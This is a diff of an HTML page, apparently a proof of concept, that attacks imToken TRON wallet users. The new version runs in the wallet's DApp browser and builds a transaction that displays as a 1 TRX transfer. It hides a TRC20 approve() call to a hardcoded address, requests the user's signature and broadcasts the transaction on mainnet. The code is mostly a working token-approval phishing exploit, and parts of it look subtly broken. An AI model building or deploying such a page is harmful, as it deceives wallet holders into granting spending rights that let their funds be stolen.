@@ -1,301 +1,179 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>imToken TRON Protobuf Field Overwrite PoC</title>
+    <title>imToken Field Override PoC</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #1a1a2e;
-            color: #e0e0e0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #16213e;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            width: 90%;
-            max-width: 600px;
-        }
-        h2 {
-            text-align: center;
-            color: #4ecca3;
-            margin-bottom: 20px;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #a0a0a0;
-        }
-        input, select {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #30475e;
-            border-radius: 6px;
-            background-color: #0f3460;
-            color: #fff;
-            box-sizing: border-box;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #4ecca3;
-            color: #1a1a2e;
-            border: none;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #3ba886;
-        }
-        .output-section {
-            margin-top: 20px;
-        }
-        textarea {
-            width: 100%;
-            height: 150px;
-            background-color: #0f3460;
-            color: #4ecca3;
-            border: 1px solid #30475e;
-            border-radius: 6px;
-            padding: 10px;
-            font-family: monospace;
-            font-size: 12px;
-            resize: vertical;
-        }
-        .info-box {
-            background-color: #e74c3c22;
-            border-left: 4px solid #e74c3c;
-            padding: 10px;
-            margin-bottom: 15px;
-            font-size: 14px;
-        }
-        .success-box {
-            background-color: #2ecc7122;
-            border-left: 4px solid #2ecc71;
-            padding: 10px;
-            margin-bottom: 15px;
-            font-size: 14px;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #1a1a1a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #2d2d2d; padding: 20px; border-radius: 12px; width: 90%; max-width: 400px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        h2 { text-align: center; color: #4ecca3; margin-top: 0; }
+        p { font-size: 14px; color: #aaa; text-align: center; margin-bottom: 20px; }
+        button { width: 100%; padding: 15px; background: #4ecca3; border: none; border-radius: 8px; color: #1a1a1a; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #3ba886; }
+        button:disabled { background: #555; cursor: not-allowed; }
+        #status { margin-top: 15px; font-size: 12px; color: #888; text-align: center; word-break: break-all; }
+        .info { font-size: 12px; color: #666; text-align: center; margin-top: 10px; line-height: 1.4; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>🎯 Protobuf 字段覆盖漏洞生成器</h2>
-    
-    <div class="info-box">
-        <strong>原理：</strong>构造一个 Transaction，其中 `TransferContract` (Type 1) 和 `TriggerSmartContract` (Type 1) 都使用 numeric field `1`。前端 UI 解析器可能只识别第一个或显示为 Transfer，但底层 JSON 解析器在反序列化时，后面的 Type 1 会覆盖前面的 Type 1，导致最终交易变为合约调用。
-    </div>
-
-    <div class="form-group">
-        <label for="trc20Address">目标 TRC20 合约地址 (Target Contract)</label>
-        <input type="text" id="trc20Address" placeholder="例如: T9yD14Nwk99DIT6eDnFy86HkKBd3xT2Y5b">
-    </div>
-
-    <div class="form-group">
-        <label for="approveAmount">授权金额 (Amount in Units)</label>
-        <input type="number" id="approveAmount" placeholder="例如: 100000000000000000000 (100 USDT)" value="100000000000000000000">
-        <small style="color: #888;">注意：这是最小单位，不包含小数位</small>
-    </div>
-
-    <div class="form-group">
-        <label for="tronAddress">你的 TRON 地址 (Owner)</label>
-        <input type="text" id="tronAddress" placeholder="例如: T...">
-    </div>
-
-    <div class="form-group">
-        <label for="network">网络选择</label>
-        <select id="network">
-            <option value="mainnet">Mainnet</option>
-            <option value="shasta">Shasta (Testnet)</option>
-            <option value="nile">Nile (Testnet)</option>
-        </select>
-    </div>
-
-    <button onclick="generatePoC()">生成 PoC JSON</button>
-
-    <div class="output-section">
-        <label>生成的 Transaction JSON (用于调用 tron.sendTransaction):</label>
-        <textarea id="resultJson" readonly placeholder="点击生成按钮..."></textarea>
-        <button onclick="copyToClipboard()" style="margin-top: 10px; background-color: #30475e; color: #fff;">复制 JSON</button>
-    </div>
-    
-    <div class="output-section">
-        <label>底层 Raw Data 解释:</label>
-        <textarea id="rawDataJson" readonly placeholder="查看 contract 内部的冲突细节..."></textarea>
+<div class="box">
+    <h2>View: Sign: </h2>
+    <p id="preview-text">点击按钮发起测试</p>
+    <button id="btn" onclick="runPoc()">发起“转账”测试</button>
+    <div id="status"></div>
+    <div class="info">
+        漏洞原理：<br>
+        UI解析器认为这是 Transfer (Type 1)<br>
+        底层解析器将其覆盖为 TriggerSmartContract (Type 1)<br>
+        最终授权 TEfF... 地址
     </div>
 </div>
 
 <script>
-    // 定义函数选择器 (Selector) for TRC20 approve(address,uint256)
-    // 通常 USDT 的 selector 是 095ea7b3...
-    // 这里使用标准的 ERC20/TRC20 approve 函数签名
-    const APPROVE_SELECTOR = "095ea7b3"; 
-
-    // TronWeb 初始化
+    // 配置
+    const TARGET_ADDR = "TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz";
+    const APPROVE_AMOUNT = "1000000000"; // 示例金额 (假设6位小数合约)
+    
+    // TRC20 Approve 函数选择器: 095ea7b3...
+    const SELECTOR = "095ea7b3";
+    
     let tronWeb;
-
-    function initTronWeb(network) {
-        switch(network) {
-            case 'mainnet':
-                tronWeb = new TronWeb({
-                    fullHost: 'https://api.trongrid.io',
-                    headers: { 'TRON-PRO-API-KEY': '' } // 可选
-                });
-                break;
-            case 'shasta':
-                tronWeb = new TronWeb({
-                    fullHost: 'https://api.shasta.trongrid.io'
-                });
-                break;
-            case 'nile':
-                tronWeb = new TronWeb({
-                    fullHost: 'https://nile.trongrid.io'
-                });
-                break;
-        }
-    }
-
-    function encodeAddressToHex(address) {
-        // TronWeb 的 address 转 hex
-        return tronWeb.address.toHex(address);
-    }
-
-    function encodeAmountToHex(amount) {
-        // 确保是 BigInt 或字符串处理，防止精度丢失
-        const bigIntAmount = BigInt(amount);
-        let hex = bigIntAmount.toString(16);
-        // 补齐 64 个字符 (32 bytes)
-        return '0000000000000000000000000000000000000000000000000000000000000000'.substring(0, 64 - hex.length) + hex;
-    }
-
-    function generatePoC() {
-        const trc20Address = document.getElementById('trc20Address').value;
-        const amount = document.getElementById('approveAmount').value;
-        const ownerAddress = document.getElementById('tronAddress').value;
-        const network = document.getElementById('network').value;
-
-        if (!trc20Address || !amount || !ownerAddress) {
-            alert('请填写所有必要字段');
-            return;
-        }
-
-        initTronWeb(network);
-
-        // 1. 构造 Data
-        // approve(address,uint256)
-        // data = selector + padded(address) + padded(amount)
-        const targetHex = encodeAddressToHex(trc20Address);
-        const amountHex = encodeAmountToHex(amount);
-        const contractData = APPROVE_SELECTOR + targetHex.substring(2) + amountHex;
-
-        // 2. 构造 TriggerSmartContract (The "Real" Transaction)
-        // This is what will override the TransferContract
-        const triggerContract = {
-            type_url: "type.googleapis.com/protocol.TriggerSmartContract",
-            value: {
-                owner_address: tronWeb.address.hexToBase58(ownerAddress),
-                contract_address: tronWeb.address.hexToBase58(trc20Address),
-                data: contractData
-            }
-        };
-
-        // 3. 构造 TransferContract (The "Fake" Display)
-        // This is what the UI might show as a simple TRX transfer
-        const transferContract = {
-            type_url: "type.googleapis.com/protocol.TransferContract",
-            value: {
-                owner_address: tronWeb.address.hexToBase58(ownerAddress),
-                to_address: tronWeb.address.hexToBase58(trc20Address),
-                amount: 1 // Tiny amount, e.g., 1 TRX
-            }
-        };
-
-        // 4. 构造 Contract 数组，模拟冲突
-        // 关键：在 JSON 中，我们同时提供两个对象。
-        // 当被解析为 Protobuf 时，如果解析器使用 numeric field tags:
-        // TransferContract = field 1
-        // TriggerSmartContract = field 1
-        // 后面的会覆盖前面的。
-        // 注意：有些解析器可能基于 type_url 判断，但漏洞在于某些实现只检查了 field tag 1。
-        
-        // 为了模拟最坏情况，我们让它们在 JSON 结构上看起来是两个独立的 contract，
-        // 但在某些旧的或特定的解析器中，它们可能被映射到同一个 internal slot 如果只看 tag。
-        // 然而，更常见的 PoC 是让它们在同一个 Contract 数组里，顺序很重要。
-        
-        const contractList = [transferContract, triggerContract];
-
-        // 5. 构造 RawData
-        const rawData = {
-            ref_block_bytes: "0000", // Placeholder
-            ref_block_hash: "0000000000000000", // Placeholder
-            expiration: Date.now() + 30000,
-            fee_limit: 1000000000, // 10 TRX fee limit
-            timestamp: Date.now(),
-            contract: contractList
-        };
-
-        // 6. 构造最终的 Transaction JSON (符合 tron.sendTransaction 格式)
-        const finalTx = {
-            visible: true,
-            txID: "0000000000000000000000000000000000000000000000000000000000000000", // Placeholder
-            raw_data: rawData,
-            raw_data_hex: "" // Will be filled if needed, but sendTransaction usually takes visible
-        };
-
-        // 为了更精确地模拟漏洞，我们可以在 contract 字段中直接混用 named 和 numeric tags
-        // 但通常 sendTransaction 接口接收的是标准 JSON。
-        // 漏洞发生在节点解析 raw_data.contract 时。
-
-        // 输出 JSON
-        document.getElementById('resultJson').value = JSON.stringify(finalTx, null, 2);
-        
-        // 输出 Raw Data 解释，突出显示冲突
-        const explanation = {
-            "contract": [
-                {
-                    "index": 0,
-                    "type": "TransferContract",
-                    "description": "UI 显示为：转账 1 TRX 到 目标地址"
-                },
-                {
-                    "index": 1,
-                    "type": "TriggerSmartContract",
-                    "description": "实际执行：授权 目标地址 花费 " + amount + " 单位代币",
-                    "data": contractData
-                }
-            ],
-            "note": "如果解析器在反序列化时，对 field tag 1 使用了 'overwrite' 策略，则 index 1 会覆盖 index 0。"
-        };
-        document.getElementById('rawDataJson').value = JSON.stringify(explanation, null, 2);
-    }
-
-    function copyToClipboard() {
-        const copyText = document.getElementById("resultJson");
-        copyText.select();
-        copyText.setSelectionRange(0, 99999); // For mobile devices
-        navigator.clipboard.writeText(copyText.value).then(() => {
-            alert("JSON 已复制到剪贴板！");
-        });
-    }
+    let userAddress;
 
     // 初始化
-    initTronWeb('mainnet');
+    async function init() {
+        try {
+            tronWeb = new TronWeb({
+                fullHost: 'https://api.trongrid.io',
+                headers: { 'TRON-PRO-API-KEY': '' }
+            });
+            
+            // 尝试获取地址，兼容 imToken 环境
+            if (window.tronWeb) {
+                tronWeb = window.tronWeb;
+            } else {
+                // 尝试通过 injected provider 获取
+                if (window.tronLink && window.tronLink.tronWeb) {
+                    tronWeb = window.tronLink.tronWeb;
+                }
+            }
+
+            if (!tronWeb || !tronWeb.isAddress) {
+                document.getElementById('status').innerText = "未检测到钱包插件，请在 imToken DApp 浏览器中打开";
+                return;
+            }
+
+            userAddress = await tronWeb.address.fromPrivateKey(tronWeb.defaultAddress.hex);
+            updateUI(true);
+        } catch (e) {
+            document.getElementById('status').innerText = "初始化失败: " + e.message;
+        }
+    }
+
+    // 执行主流程
+    async function runPoc() {
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+        btn.disabled = true;
+        status.innerText = "正在构建交易...";
+
+        try {
+            // 1. 构造 Data: approve(address,uint256)
+            const targetHex = tronWeb.address.toHex(TARGET_ADDR);
+            const amountHex = tronWeb.toHex(BigInt(APPROVE_AMOUNT)).replace('0x', '');
+            const paddedAmount = '0'.repeat(64 - amountHex.length) + amountHex;
+            const contractData = SELECTOR + targetHex.substring(2) + paddedAmount;
+
+            // 2. 构造两个 Contract 对象，利用 JSON 键名冲突
+            // TransferContract 放在前面，TriggerSmartContract 放在后面
+            // 在 Protobuf 解析中，如果都映射到 field tag 1，后面的会覆盖前面的
+            const contracts = [
+                {
+                    type_url: "type.googleapis.com/protocol.TransferContract",
+                    value: {
+                        owner_address: tronWeb.address.toBase58(userAddress),
+                        to_address: tronWeb.address.toBase58(TARGET_ADDR),
+                        amount: 1 // UI 显示只转 1 TRX
+                    }
+                },
+                {
+                    type_url: "type.googleapis.com/protocol.TriggerSmartContract",
+                    value: {
+                        owner_address: tronWeb.address.toBase58(userAddress),
+                        contract_address: tronWeb.address.toBase58(TARGET_ADDR),
+                        data: contractData
+                    }
+                }
+            ];
+
+            // 3. 构建 RawData
+            const rawData = {
+                ref_block_bytes: tronWeb.core.getCurrentBlock().visible ? tronWeb.core.getCurrentBlock().id.substring(0, 4) : "0000", // 简化引用块
+                ref_block_hash: tronWeb.core.getCurrentBlock().visible ? tronWeb.core.getCurrentBlock().id.substring(8, 24) : "0000000000000000",
+                expiration: Date.now() + 30000,
+                fee_limit: 100000000, // 0.1 TRX fee limit
+                timestamp: Date.now(),
+                contract: contracts
+            };
+
+            // 4. 获取完整 Transaction 对象 (用于计算 txID)
+            // 注意：这里我们手动构建一个 visible 对象，模拟钱包接收到的数据
+            const transaction = {
+                visible: true,
+                txID: tronWeb.trx.transactionHash(rawData),
+                raw_data: rawData
+            };
+
+            status.innerText = "正在请求 imToken 签名...";
+            
+            // 5. 请求签名
+            // 关键：imToken 的 tronWeb 注入对象通常支持 signTransaction
+            // 或者通过 window.ethereum 兼容层
+            let signedTx;
+            if (window.tronLink) {
+                signedTx = await window.tronLink.tronWeb.trx.sign(transaction);
+            } else if (tronWeb.defaultAddress && tronWeb.defaultAddress.privateKey) {
+                // 如果本地有私钥
+                signedTx = await tronWeb.trx.sign(transaction);
+            } else {
+                throw new Error("无法获取私钥，请连接钱包");
+            }
+
+            status.innerText = "签名成功，正在广播...";
+            
+            // 6. 广播
+            const result = await tronWeb.trx.sendRawTransaction(signedTx);
+            
+            if (result.ret && result.ret.length > 0 && result.ret[0].contractRet === 'SUCCESS') {
+                status.innerText = "✅ 成功! TXID: " + result.txid;
+                document.getElementById('preview-text').innerText = "View: Transfer 1 TRX\nSign: Approve " + APPROVE_AMOUNT + " tokens to " + TARGET_ADDR.substring(0,4) + "...";
+            } else {
+                status.innerText = "❌ 广播失败: " + JSON.stringify(result);
+            }
+
+        } catch (e) {
+            console.error(e);
+            status.innerText = "错误: " + e.message;
+        } finally {
+            btn.disabled = false;
+        }
+    }
+
+    function updateUI(connected) {
+        const btn = document.getElementById('btn');
+        if (connected) {
+            btn.innerText = "发起“转账”测试";
+        } else {
+            btn.innerText = "连接钱包中...";
+            btn.disabled = true;
+        }
+    }
+
+    // 启动
+    init();
 </script>
 
 </body>
